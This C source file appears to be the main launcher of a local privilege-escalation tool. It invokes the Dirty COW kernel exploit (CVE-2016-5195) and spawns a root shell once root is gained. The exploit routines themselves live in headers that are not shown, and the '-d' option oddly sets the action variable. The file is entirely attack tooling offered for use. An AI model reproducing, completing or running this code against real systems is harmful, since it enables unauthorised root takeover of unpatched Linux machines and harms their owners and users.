#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <ctype.h>

#include "exploits.h"
#include "main.h"
#include "actions.h"

int exploit = 0;
int action = 0;

void usage(){
	fprintf (stderr, "Usage: %s [options]\n", self[0]);
	fprintf (stderr, "Exploit options:\n");
	fprintf (stderr, "	-d: (default) Dirtycow CVE-2016-5195\n");
	fprintf (stderr, "Action options:\n");
	fprintf (stderr, "	-l: (default) Execute local shell after root is obtained\n");
	if (exploit == 0)
		dirtycow_help();
	if (action == 0)
		action_local_shell_help();
}

// https://www.gnu.org/software/libc/manual/html_node/Example-of-Getopt.html
int main(int argc,char *argv[]) {
	self[0] = argv[0];
	int euid=geteuid();
	int c;

	while ((c = getopt (argc, argv, "dlh")) != -1)
	switch (c)
	{
		case 'd':
			action = 0;
			break;
		case 'l':
			action = 0;
			break;
		case 'h':
			usage();
			return 0;
			break;
/*		case 'c':
			cvalue = optarg;
			break;
*/		case '?':
/*			if (optopt == 'c')
				fprintf (stderr, "Option -%c requires an argument.\n", optopt);
			else */ if (isprint (optopt))
				fprintf (stderr, "Unknown option `-%c'.\n", optopt);
			else
				fprintf (stderr,
					"Unknown option character `\\x%x'.\n",
					optopt);
				usage();
			return 1;
		}

	printf("Payload running\n");
	dirtycow_init(euid);
	if (euid == 0) {
		if (action == 0)
			action_local_shell();
	}
	printf("From %d to 0!\n", euid);
	if (exploit == 0)
		dirtycow_run();
	return 0;
}
